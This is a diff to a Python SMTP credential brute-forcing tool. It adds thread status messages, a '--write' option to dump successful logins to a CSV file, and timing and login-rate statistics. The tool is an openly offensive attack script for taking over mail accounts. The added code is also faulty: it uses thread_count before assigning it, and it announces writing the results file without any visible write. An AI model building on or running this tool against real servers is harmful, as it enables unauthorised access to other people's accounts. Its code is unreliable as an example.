@@ -61,6 +61,8 @@ def brute_force(thread_index, mail_server, port, credentials):
     return successful_logins
 def main(server, port, credentials):
     successful_logins = {}
+    display('+', f"Starting {Back.MAGENTA}{thread_count} Brute Force Threads{Back.RESET}")
+    display(':', f"Credentials / Threads = {Back.MAGENTA}{len(credentials)//thread_count}{Back.RESET}")
     thread_count = cpu_count()
     pool = Pool(thread_count)
     threads = []
@@ -72,6 +74,7 @@ def main(server, port, credentials):
         successful_logins.update(thread.get())
     pool.close()
     pool.join()
+    display('+', f"Threads Finished Excuting")
     return successful_logins
 
 if __name__ == "__main__":
@@ -79,7 +82,8 @@ if __name__ == "__main__":
                               ('-p', "--port", "port", f"Port of Target SMTP Server (Default={port})"),
                               ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                               ('-p', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
-                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"))
+                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
+                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
     if not arguments.server:
         display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
         exit(0)
@@ -125,4 +129,15 @@ if __name__ == "__main__":
         except:
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
+    if not arguments.write:
+        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
+    t1 = time()
+    successful_logins = main(arguments.server, arguments.port, arguments.credentials)
+    t2 = time()
+    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
+    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
+    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
+    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
+    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
+    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
